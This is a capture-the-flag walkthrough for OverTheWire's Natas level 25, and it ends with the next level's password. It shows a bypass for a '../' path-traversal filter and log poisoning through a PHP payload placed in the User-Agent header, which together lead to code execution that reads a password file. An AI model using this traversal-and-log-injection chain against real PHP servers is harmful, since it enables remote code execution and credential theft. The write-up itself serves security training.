# URL: http://natas25.natas.labs.overthewire.org/

# Solution:

File: `LEVEL_25_source_code.php` contains PHP code with some comments.  
So the website is actually parsing the `lang` param, tries to escape it from path traversal and then includes that file. Additionally it prevents accessing `natas_webpass` directory via `lang` param.  
So we need some way to include our own PHP script that will be able to read from:  
`/etc/natas_webpass/natas16`

Let's examine: `safeinclude` function to see if we can get any exploits:

```
function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) {
            include($filename);
            return 1;
        }
        return 0;
    }
```

So the function check for `../` existence and replace occurences with `` but we can still exploit it in following way:  
Passing such string: `../.../...//../.../...//'` will be equal to `../../` after replacement. So we can still do path traversal to include any file that we want (of course including permissions).

But we still need to somehow inject PHP code into to a file that we could include later on, so is there any place in that source code writing something to a file to which we have permission?

```
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n";
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

Okay so what can we control?

1. `$SERVER['HTTP_USER_AGENT']` is actually the value of `User-Agent` request header so we control that
2. The final name of file is dedicated by the value of our cookie so we also control that.

Okay so we can do following:

1. Set your Cookie to for example: `lovectfs`
2. Pass: `<?php $password=file_get_contents('/etc/natas_webpass/natas26'); echo $password;?>` as `User-Agent` header value -> that is going to be injected PHP code into logs
3. Since we know the logfile path, we can include it by path traversing via `lang` param as follows:  
   `../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//../.../...//var/www/natas/natas25/logs/natas25_lovectfs.log`
4. Executing such request will print value of password

`Natas 26 password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`
